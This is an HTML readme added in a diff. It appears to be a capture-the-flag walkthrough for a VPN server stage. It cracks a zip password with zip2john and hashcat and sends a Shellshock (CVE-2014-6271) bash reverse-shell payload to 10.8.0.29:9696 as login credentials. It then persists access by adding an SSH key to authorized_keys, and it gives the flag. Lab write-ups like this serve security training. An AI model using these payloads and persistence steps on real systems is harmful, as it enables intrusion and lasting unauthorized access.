@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <style type="text/css">body {
+font-family: Arial, sans-serif;
+line-height: 1.6;
+background-color: #121212;
+color: #e0e0e0;
+padding: 20px;
+}
+h1, h2, h3, h4, h5, h6 {
+color: #ff9800; 
+}
+code {
+background-color: #333;
+padding: 2px 4px;
+border-radius: 4px;
+font-family: 'Courier New', Courier, monospace;
+color: #ff5722; 
+}
+pre {
+background-color: #333;
+padding: 10px;
+border-radius: 4px;
+overflow-x: auto;
+color: #ff5722; 
+}
+a {
+color: #bb86fc;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+ul {
+margin: 20px 0;
+padding: 0 20px;
+border-left: 2px solid #ff9800; 
+}
+li {
+margin: 10px 0;
+}
+strong {
+color: #ff9800; 
+}
+</style>
+</head>
+<body>
+<h1 id="vpn-server">VPN Server</h1>
+<ol type="1">
+<li><p><strong>Resume From <a href="/2_mail_server/">Mail Server</a></strong></p></li>
+<li><p><strong>Get OVPN from Mail Server: <a href="/2_mail_server/08-store0/6/msg/0/257-2.msg">257-2.msg</a></strong></p></li>
+<li><p><strong>Decode Zip File from Base64: <code>https://gchq.github.io/CyberChef/</code></strong></p></li>
+<li><p><strong>Install <code>John The Ripper</code></strong></p></li>
+<li><p><strong>Generate Hash:</strong></p>
+<pre class="shell"><code>~/CTF/JohnTheRipper/run/zip2john 3_vpn.zip &gt; hashes/5-zip_hashes.txt</code></pre></li>
+<li><p><strong>Edit File (remove file names from hashes): <a href="./hashes/6-zip_hashes.txt">Zip Hashes</a></strong></p></li>
+<li><p><strong>Run Hashcat</strong></p>
+<pre class="shell"><code>hashcat -m 13600 -a 3 ./hashes/6-zip_hashes.txt &quot;?l?l?l?l?l?l?l&quot;
+
+# to show Results
+hashcat -m 13600 -a 3 ./hashes/6-zip_hashes.txt &quot;?l?l?l?l?l?l?l&quot; --show &gt; hashes/7-hashcat.txt</code></pre></li>
+<li><p><strong>Hashcat Results in <a href="./hashes/07-hashcat.txt">Hashcat</a>: <code>ehsanit</code></strong></p></li>
+<li><p><strong>Using ShellShock OpenVPN Exploit: <a href="./34879.txt">CVE-2014-6271</a></strong></p></li>
+<li><p><strong>Extract and Edit: <code>09_vpn\client.ovpn</code></strong></p>
+<pre class="shell"><code>remote 172.16.3.64 1194</code></pre></li>
+<li><p><strong>Make SSH key</strong></p>
+<pre class="shell"><code>ssh-keygen -t ed25519 -f ./id_ed25519 -N &quot;&quot;</code></pre></li>
+<li><p><strong>Start:</strong></p>
+<pre class="shell"><code>nc -l 0.0.0.0 9696</code></pre></li>
+<li><p><strong>Let’s Connect:</strong></p>
+<pre class="shell"><code>cd 9_vpn
+openvpn client.ovpn</code></pre></li>
+<li><p><strong>Send Username, Password</strong></p>
+<pre class="shell"><code>() { :;};/bin/bash -i &gt;&amp; /dev/tcp/10.8.0.29/9696 0&gt;&amp;1 &amp;</code></pre></li>
+<li><p><strong>Read Flag: <code>MAZAPA_1a75e527fd045659662be54a5171627f</code></strong></p></li>
+<li><p><strong>Persist Your Connection:</strong></p>
+<pre class="shell"><code>echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCswCp0rS8p6Ost8dvKK7ZQHrrgfEYo1JM1cEroUnY4 danial@pop-os &gt;&gt; ~/.ssh/authorized_keys
+
+cat ~/.ssh/authorized_keys
+
+chmod 600 ~/.ssh/authorized_keys </code></pre></li>
+<li><p><strong>Connect with SSH</strong></p>
+<pre class="shell"><code>ssh -i ./id_ed25519 -p 2200 vpn_user@172.16.3.64</code></pre></li>
+</ol>
+</body>
+</html>
